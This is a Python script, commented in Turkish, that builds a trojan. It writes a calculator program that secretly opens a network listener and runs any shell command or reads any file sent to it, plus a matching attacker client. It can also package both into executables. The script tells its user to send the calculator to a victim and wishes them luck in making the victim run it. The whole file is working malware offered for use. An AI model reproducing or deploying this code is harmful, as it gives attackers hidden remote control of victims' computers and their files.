import subprocess

print("sen.py dosyası sizde kalacak o.py dosyayını hesef kişiye göndereceksiniz...")


print("Host")
host = str(input("> "))

print("Port")
port = str(input("> "))

sen = f'''
import socket

host = '{host}'
port = {port}

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((host, port))

def send_command(message):
    if message != "":
        client_socket.send(message.encode())
        data = client_socket.recv(1024).decode()
        if message.startswith("ip"):
            print("IPv4 and IPv6 addresses:")
            print(data)
        else:
            print("Response from server: " + str(data))

message = input(">> ")

while message != "exit":
    if message.startswith("get"):
        # Dosya isteği yaparken sunucuya dosya adını bildirin
        client_socket.send(message.encode())
        file_data = client_socket.recv(1024).decode()
        print("File content:\n" + file_data)
    else:
        send_command(message)
    message = input(">> ")

client_socket.close()
'''

o = f'''
import threading
import tkinter as tk
import socket
import subprocess as s

# Hesap makinesi kodunu fonksiyon içine alalım
def run_calculator():
    def button_click(number):
        current = entry.get()
        entry.delete(0, tk.END)
        entry.insert(0, str(current) + str(number))

    def button_clear():
        entry.delete(0, tk.END)

    def button_add():
        first_number = entry.get()
        global f_num
        global math
        math = "addition"
        f_num = float(first_number)
        entry.delete(0, tk.END)

    def button_subtract():
        first_number = entry.get()
        global f_num
        global math
        math = "subtraction"
        f_num = float(first_number)
        entry.delete(0, tk.END)

    def button_multiply():
        first_number = entry.get()
        global f_num
        global math
        math = "multiplication"
        f_num = float(first_number)
        entry.delete(0, tk.END)

    def button_divide():
        first_number = entry.get()
        global f_num
        global math
        math = "division"
        f_num = float(first_number)
        entry.delete(0, tk.END)

    def button_equal():
        second_number = entry.get()
        entry.delete(0, tk.END)
        if math == "addition":
            entry.insert(0, f_num + float(second_number))
        elif math == "subtraction":
            entry.insert(0, f_num - float(second_number))
        elif math == "multiplication":
            entry.insert(0, f_num * float(second_number))
        elif math == "division":
            entry.insert(0, f_num / float(second_number))

    root = tk.Tk()
    root.title("Hesap Makinesi")

    entry = tk.Entry(root, width=35, borderwidth=5)
    entry.grid(row=0, column=0, columnspan=4, padx=10, pady=10)

    # Butonlar
    button_1 = tk.Button(root, text="1", padx=40, pady=20, command=lambda: button_click(1))
    button_2 = tk.Button(root, text="2", padx=40, pady=20, command=lambda: button_click(2))
    button_3 = tk.Button(root, text="3", padx=40, pady=20, command=lambda: button_click(3))
    button_4 = tk.Button(root, text="4", padx=40, pady=20, command=lambda: button_click(4))
    button_5 = tk.Button(root, text="5", padx=40, pady=20, command=lambda: button_click(5))
    button_6 = tk.Button(root, text="6", padx=40, pady=20, command=lambda: button_click(6))
    button_7 = tk.Button(root, text="7", padx=40, pady=20, command=lambda: button_click(7))
    button_8 = tk.Button(root, text="8", padx=40, pady=20, command=lambda: button_click(8))
    button_9 = tk.Button(root, text="9", padx=40, pady=20, command=lambda: button_click(9))
    button_0 = tk.Button(root, text="0", padx=40, pady=20, command=lambda: button_click(0))

    button_add = tk.Button(root, text="+", padx=39, pady=20, command=button_add)
    button_subtract = tk.Button(root, text="-", padx=41, pady=20, command=button_subtract)
    button_multiply = tk.Button(root, text="*", padx=41, pady=20, command=button_multiply)
    button_divide = tk.Button(root, text="/", padx=41, pady=20, command=button_divide)

    button_equal = tk.Button(root, text="=", padx=91, pady=20, command=button_equal)
    button_clear = tk.Button(root, text="Clear", padx=79, pady=20, command=button_clear)

    # Butonların konumları
    button_1.grid(row=3, column=0)
    button_2.grid(row=3, column=1)
    button_3.grid(row=3, column=2)

    button_4.grid(row=2, column=0)
    button_5.grid(row=2, column=1)
    button_6.grid(row=2, column=2)

    button_7.grid(row=1, column=0)
    button_8.grid(row=1, column=1)
    button_9.grid(row=1, column=2)

    button_0.grid(row=4, column=0)
    button_clear.grid(row=4, column=1, columnspan=2)

    button_add.grid(row=5, column=0)
    button_equal.grid(row=5, column=1, columnspan=2)

    button_subtract.grid(row=6, column=0)
    button_multiply.grid(row=6, column=1)
    button_divide.grid(row=6, column=2)

    root.mainloop()

# İkinci kod parçası: Sunucu kodu
def run_server():
    host = '{host}'
    port = {port}

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))

    server_socket.listen(1)  # Bağlantıları dinle

    conn, addr = server_socket.accept()
    print("Connected from: " + str(addr))

    while True:
        data = conn.recv(1024).decode()
        print(data)

        if data == "exit":  # Eğer 'exit' mesajı alınırsa döngüden çık
            break

        if data.startswith("ip"):
            result = s.run("ip a", shell=True, capture_output=True)
            response_data = result.stdout
        elif data.startswith("get"):
            # Dosya adını alın
            file_name = data.split()[1]
            try:
                # Dosyanın içeriğini okuyun ve istemciye gönderin
                with open(file_name, 'r') as file:
                    response_data = file.read().encode()
            except FileNotFoundError:
                response_data = "Dosya bulunamadı.".encode()
        else:
            result = s.run(data, stdout=s.PIPE, shell=True)
            if result.stdout.decode() != "":
                response_data = result.stdout
            elif data.startswith("aç"):
                dosya_adi = data[3:]
                try:
                    with open(dosya_adi, 'r') as dosya:
                        response_data = dosya.read().encode()
                except FileNotFoundError:
                    response_data = "Dosya bulunamadı.".encode()
            elif data.startswith("çalıştır"):
                komut = data[9:]
                try:
                    result = s.run(komut, stdout=s.PIPE, stderr=s.PIPE, shell=True)
                    if result.returncode == 0:
                        response_data = result.stdout
                    else:
                        response_data = result.stderr
                except Exception as e:
                    response_data = str(e).encode()
            else:
                response_data = "Command Error".encode()

        conn.send(response_data)

    conn.close()
    server_socket.close()

# Her iki kodu da ayrı thread'lerde çalıştıralım
calculator_thread = threading.Thread(target=run_calculator)
server_thread = threading.Thread(target=run_server)

# Thread'leri başlat
calculator_thread.start()
server_thread.start()
'''

with open("sen.py", "w") as dosya:
    dosya.write(sen)

with open("o.py","w") as dosya1:
    dosya1.write(o)

print("Bizi tercih ettiğiniz için teşekkürler\ntrojen'i yedirmede bol şans")

print("trojen'i exeye çevirmek için 1 çıkmak için 1 dışında herhangi bir tuşa basın...")
a = int(input(""))
if a == 1:
    subprocess.run(["pyinstaller", "--onefile", "sen.py"], check=True)
    subprocess.run(["pyinstaller", "--onefile", "o.py"], check=True)
    print("Dosya başarıyla .exe'ye dönüştürüldü!")
else:
    quit()
